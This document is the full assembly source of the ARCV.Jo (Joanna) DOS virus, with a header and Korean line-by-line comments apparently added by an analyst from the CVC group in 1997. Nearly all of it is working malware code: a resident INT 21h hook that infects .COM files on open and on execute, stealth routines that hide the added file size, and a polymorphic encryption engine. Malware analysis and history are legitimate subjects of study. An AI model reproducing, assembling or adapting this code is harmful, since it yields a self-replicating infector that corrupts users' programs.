;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                       ARCV.Jo                               CVC #01   97/06
;                       -------
;
; 이름 : ARCV.Jo
; 제작자 : Apache Warrior, 영국
; 분석 : Osiris of CVC,Corea 97/06
; 종류 : Resident .COM Encryption  Stealth
;
; This is Yet another virus from the ARCV, this one is called
; Joanna, it was written by Apache Warrior, ARCV President.
;
; It has Stealth features, it is a Resident infector of .COM files
; and uses the Cybertech Mutation Engine (TM) by Apache Warrior for 
; its Polymorphic features.  There is a maximum of 3 unchanged bytes
; in the Encrypted code.
;
; 과거 영국의 바이러스 그룹인 ARCV 에서 제작한 바이러스이다.
; ARCV 의 멤버는 두명인데 영국 경찰에 체포 되었다.
;
; 그들의 바이러스는 그렇게 뛰어나지 않다고 한다.
;
; 아쉬운건 치명적인 에러 (Int 24h) 를 처리 하지 않은 것이다.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
.model tiny

code segment

                ASSUME CS:CODE,DS:CODE,ES:CODE

int_21ofs       equ 84h                         ;
int_21seg       equ 86h                         ;
length          equ offset handle-offset main   ; 길이
msglen          equ offset oldstart-offset msg  ; 메시지 길이
tsrlen          equ (offset findat-offset main)/10 ; 램상주 크기
len             equ offset handle-offset main   ;
virlen          equ (offset string-offset main2)/2
decryptlen      equ offset main2-offset main    ; 암호길이

                org 100h  

start:          jmp main
                db 0,0,0

main:           mov si,offset main2             ; 암호해제를 위한 SI 값
                mov cx,virlen                   ; 암호화된 크기
loop_1:         
                db 2eh,81h,2ch                  ; 암호풀기
switch:         dw 0
                add si,02h
                dec cx
                jnz loop_1

;
main2:          call findoff                    ; 델타오프셋구하기
findoff:        pop si                          ; 
                sub si,offset findoff           ;
                push ds
                push es
                push cs                         ; cs=ds
                pop ds
                push cs                         ; cs=es
                pop es
                mov ax,0ff05h                   ; Scythe2 Boot 검사
                int 13h
                cmp ah,0e9h                     ;
                jnz haha                        ;
                mov ah,09h                      ; 존재하면 메시지 출력
                lea dx,[si+offset msg2]         ; 하고 시스템 정지
                int 21h                         ;
                jmp $                           ; (무한 루프)

haha:           mov ah,2ah                      ; 시스템 날짜 구하기
                int 21h                         ;
                cmp dx,1210h                    ; 10 월달인가 ?
                jnz main3                       ;
                mov ah,09h                      ; 메시지 출력
                lea dx,[si+offset msg] 
                int 21h

main3:          mov di,0100h                    ; 원래 프로그램의 앞부분 복구
                push si                         ; 5 바이트
                mov ax,offset oldstart          ;
                add si,ax                       ;
                mov cx,05h                      ;
                cld                             ;
                repz movsb                      ;

inst:           mov ax,0ffa4h                   ; 이미 기억장소에 상주해 있는가 ?
                int 21h
                pop si                          ; SI
                cmp ax,42a1h
                je oldprog                      ; 이미 상주해 있으면 재실행

tt2:            xor ax,ax                       ; 램 상주 루틴
                push ax
                mov ax,ds                       ; MBC 세그먼트 주소 얻기
                dec ax                          ; PSP - 1 = MCB
                mov es,ax                       ; ES = MCB 주소
                pop ds                          ; 
                mov ax,word ptr ds:int_21ofs    ; Int 21h 주소값 얻기
                mov cx,word ptr ds:int_21seg    ;
                mov word ptr cs:[si+int21],ax   ; Int 21h 주소값 저장
                mov word ptr cs:[si+int21+2],cx ;
                cmp byte ptr es:[0],5ah         ; 시작되는 MCB 인가 ?
                jne oldprog                     ; 이경우 도스창에서는 작동안함
                mov ax,es:[3]                   ;
                sub ax,0bch                     ; 3008 바이트보다 작은가 ?
                jb  oldprog                     ;
                mov es:[3],ax                   ;
                sub word ptr es:[12h],0bch      ;
                mov es,es:[12h]                 ;
                push ds                         ;
                push cs                         ;
                pop ds                          ; 바이러스 복사
                mov di,0100h                    ;
                mov cx,len+5                    ;
                push si                         ;
                add si,0100h                    ;
                rep movsb                       ;
                pop si
                pop ds
                cli                             ;
                mov ax,offset new21             ; Int 21h 바꾸기
                mov word ptr ds:int_21ofs,ax    ;
                mov word ptr ds:int_21seg,es    ;
                sti                             ;

oldprog:        
                mov di,0100h                    ; 진짜 COM 의 앞부분 복구
                pop es                          ;
                pop ds                          ;
                push di                         ;
                ret                             ;

int21           dd 0h                           ; Int 21h 의 주소값

;
;   New interupt 21h Handler
;

sayitis:        mov ax,42a1h                    ; 기억장소에 상주해있다
                iret 

new21:          ;nop                            ; Sign byte 
                cmp ax,0ffa4h                   ; 램상주 검사 ?
                je sayitis
                cmp ah,11h                      ; FCB Search file
                je adjust_FCB
                cmp ah,12h                      ; FCB Search Again
                je adjust_FCB
                cmp ah,4eh                      ; Handle Search file
                je adjust_FCB    
                cmp ah,4fh                      ; Handle Search Again
                je adjust_FCB
                cmp ah,3dh                      ; 파일 오픈
                je intgo                        ;
                cmp ah,4bh                      ; 파일 실행
                jne noint 
intgo:          push ax                         ; 4bh, 3dh Infect file
                push bx                         ; 레지스터들 저장
                push cx
                push es
                push si
                push di
                push dx
                push ds
                call checkit                    ; 감염 루틴 호출
                pop ds
                pop dx
                pop di
                pop si
                pop es
                pop cx
                pop bx
                pop ax
noint:          jmp cs:[int21]                  ; 원래의 Int 21h 로

adjust_FCB:     push es                         ; 스텔스 루틴
                push bx
                push si
                push ax
                xor si,si
                and ah,40h                      ; 4Eh,4Fh 찾기 인가 ?
                jz okFCB
                mov si,1                        ; Set flag
okFCB:          mov ah,2fh                      ; DTA 주소 얻기
                int 21h 
                pop ax                          ; 진짜 펑션 (11h,12h,4Eh,4Fh)
                call i21                        ; 실행
                pushf                           ; flag 저장
                push ax                         ; AX 에러 코드 저장
                call adjust                     ; 스텔스 루틴 호출
                pop ax                          ; 레지스터 복구
                popf
                pop si
                pop bx
                pop es
                retf 2                          ; 리턴

adjust:         pushf                           ; 스텔스 루틴 체크
                cmp si,0                        ; 11h,12h 인가 ?
                je fcb1
                popf
                jc repurn                       ; 에러인가 ?
                mov ah,byte ptr es:[bx+16h]     ;
                and ah,01ah                     ; 감염 되었나 ?
                cmp ah,01ah                     ;
                jne repurn                      ; 
                sub word ptr es:[bx+1ah],len    ; 파일 길이 - 바이러스 길이
; COM 파일이기 때문에 64 KB 를 넘지 않으므로 SBB 를 쓰지 않았다.
; EXE 파일의 경우 SBB 를 사용해야 한다.
repurn:         ret                             ; from file size.

fcb1:           popf                            ; FCB 를 위한 루틴
                cmp al,0ffh                     ; 에러 ?
                je meat_hook   
                cmp byte ptr es:[bx],0ffh       ; 확장 FCB 인가 ?
                jne xx2
                add bx,7                        ; + 7
xx2:            mov ah,byte ptr es:[bx+17h]     ; 감염 여부 검사
                and ah,01ah
                cmp ah,01ah
                jne meat_hook
                sub word ptr es:[bx+1dh],len    ;
meat_hook:      ret  

com_txt db 'COM',0                              ; 확장자

reset:                                          ; 파일 속성 루틴
                mov cx,20h                      ; 파일을 읽기 / 쓰기로
set_back:                                       ; 바꿈
                mov al,01h
find_att:
                mov ah,43h                      ; 파일 속성
i21:            pushf
                call cs:[int21]
exitsub:        ret   

checkit:                                        ; Infect routine
                push es                         ; 더 많은 레지스터들 저장
                push ds
                push ds                         ; 확장자가 COM 인지 검사
                pop es                          ;
                push dx                         ;
                pop di                          ;
                mov cx,0ffh                     ; . 찾기
                mov al,'.'                      ;
                repnz scasb                     ;
                push cs                         ; cs=ds
                pop ds                          ;
                mov si,offset com_txt           ; COM 인가 ?
                mov cx,3                        ;
                rep cmpsb                       ;
                pop ds                          ;
                pop es                          ;
                jnz exitsub                     ;

foundtype:      sub di,06h                      ; commaND.com 인지 검사
                cmp ds:[di],'DN'                ;
                je exitsub                      ;
                mov word ptr cs:[nameptr],dx    ; DS:DX 저장
                mov word ptr cs:[nameptr+2],ds  ;
                mov al,00h                      ; 파일의 속성 얻기
                call find_att                   ;
                jc exitsub                      ; 에러 ?

alteratr:       mov cs:[attrib],cx              ; 속성 저장
                call reset                      ; 읽기/쓰기로 바꿈

                mov ax,3d02h                    ; 오픈
                call i21        
                jc exitsub                      ; 에러 ?
                push cs                         ;
                pop ds                          ; CS=DS
                mov ds:[handle],ax              ; 파일 핸들 저장

                mov ax,5700h                    ; 파일의 작성일/시간 얻기
                mov bx,ds:[handle]              ;
                call i21                        ;
ke9:            mov ds:[date],dx                ; 날짜 저장
                or cx,1ah                       ; 감염 된 것으로 처리
                mov ds:[time],cx                ; 시간 저장
                                                  
                mov ah,3fh                      ; 앞의 5 바이트 읽기
                mov cx,05h                      ;
                mov dx,offset oldstart          ;
                call i21                        ;
closeit:        jc close2                       ; 에러 ?

                mov ax,4202h                    ; 파일 끝에서 -5 바이트 되는
                mov cx,0ffffh                   ; 위치로 이동
                mov dx,0fffbh                   ;
                call i21                        ;
                jc close                        ; 에러 ?

                mov word ptr cs:si_val,ax       ; 파일 사이즈 저장
                cmp ax,0ea60h                   ; EA60h 보다 큰가 ?
                jae close                       ;

                mov ah,3fh                      ; 5 바이트 읽기
                mov cx,05h                      ; 
                mov dx,offset tempmem           ; 
                call i21                        ; 
                jc close                        ;

                push cs                         ; cs=es
                pop es                          ;
                mov di,offset tempmem           ; 감염 여부 확인
                mov si,offset string            ;
                mov cx,5                        ;
                rep cmpsb                       ;
                jz close                        ;
                                                 
zapfile:                                        ;
                mov ax,word ptr cs:si_val       ; 
                add ax,2                        ;
                push cs                         ; 
                pop ds                          ; 
                mov word ptr ds:[jpover+1],ax   ; 새로운 점프 위치 설정
                call mut_eng                    ; Call Mutation Engine
                mov ah,40h                      ; 쓰기
                mov bx,cs:[handle]              ; Handle
                mov cx,length                   ; LENGTH OF PROGRAM****
                call i21                        ; 쓰기 수행!
close2:         jc close                        ; Quit if error

                push cs                         ; Reset DS to CS
                pop ds                          ;      
                mov ax,4200h                    ; 포인터를 처음으로 이동
                xor cx,cx                       ;
                cwd                             ; Clever way to XOR DX,DX
                call i21                        ;
                jc close                        ; Error Quit..
                                                 
                mov ah,40h                      ; Save new start 
                mov cx,03h                      ; 
                mov dx,offset jpover            ;
                call i21                        ;

close:          mov ax,5701h                    ; Time & Date 복구
                mov bx,ds:[handle]              ;
                mov cx,ds:[time]                ;
                mov dx,ds:[date]                ;
                call i21                        ;
                mov ah,3eh                      ; 파일 닫기
                call i21                        ;
exit_sub:       mov dx,word ptr [nameptr]       ; 속성 복구
                mov cx,ds:[attrib]              ;
                mov ds,word ptr cs:[nameptr+2]  ;
                call set_back                   ;
                ret                             ; Return to INT 21h Handler


;******************************************************************************
;               CyberTech Mutation Engine 
;
;               This is Version Two of the Mutation Engine 
;               Unlike others it is very much Virus Specific..  Works
;               Best on Resident Viruses..
;
;               To Call
;
;               si_val = File Size
;
;               Returns
;               DS:DX = Encrypted Virus Code, Use DS:DX pointer to
;                       Write From..
;
;******************************************************************************


mut_eng:
                mov ah,2ch                      ; Get Time
                call i21                        ;
                mov word ptr ds:[switch],dx     ; Use Sec./100th counter as key
                mov word ptr ds:[switch2+1],dx  ; Save to Decrypt and Encrypt
                mov ax,cs:[si_val]              ; 파일 크기 얻기
                mov dx,offset main2             ;
                add ax,dx                       ;
                mov word ptr [main+1],ax        ; Decrypt offset 복구
                xor byte ptr [loop_1+2],28h     ; Add/Sub 변환
                xor byte ptr switch2,28h        ;    "
                push cs                         ; CS=DS
                pop ds                          ;
                push cs                         ; CS=AX
                pop ax                          ;
                sub ax,0bch                     ;
                mov es,ax                       ; 여분의 세그먼트 구하기
                mov si,offset main              ; 암호루틴 복사
                mov di,0100h                    ;
                mov cx,decryptlen               ;
                rep movsb                       ;
                mov si,offset main2             ; 코드 암호화 시작
                mov cx,virlen                   ;
loop_10:        lodsw                           ;
switch2:        add ax,0000                     ; 암호화
                stosw                           ;
                loop loop_10                    ;
                mov si,offset string            ; 감염 ID 저장
                mov cx,5                        ;
                rep movsb                       ;
                mov dx,0100h                    ;
                push es                         ;
                pop ds                          ;
                ret                             ;

; Data Section, contains Messages etc.


;               Little message to the Wife to Be..

msg             db 'Looking Good Slimline Joanna.',0dh,0ah
                db 'Made in England by Apache Warrior, ARCV Pres.',0dh,0ah,0ah 
                db 'Jo Ver. 1.11 (c) Apache Warrior 92.',0dh,0ah
                db '$'

msg2            db 'I Love You Joanna, Apache..',0dh,0ah,'$'

virus_name      db '[JO]',00h                           ; Virus Name..
author          db 'By Apache Warrior, ARCV Pres.'      ; Thats me..
filler          dd 0h

oldstart:       mov ax,4c00h                    ; Orginal program start
                int 21h
                nop
                nop

j100h           dd 0100h                        ; Stores for jumps etc
jpover          db 0e9h,00,00h                  ;

string          db '65fd3'                      ; ID String 

heap:                                           ; This code is not saved
handle          dw 0h                           ; 파일 핸들
nameptr         dd 0h                           ;
attrib          dw 0h                           ; 속성
date            dw 0h                           ; 날짜
time            dw 0h                           ; 시간
tempmem         db 10h dup (?)                  ;
findat          db 0h                           ;
si_val          dw 0h                           ;

code ends

end start
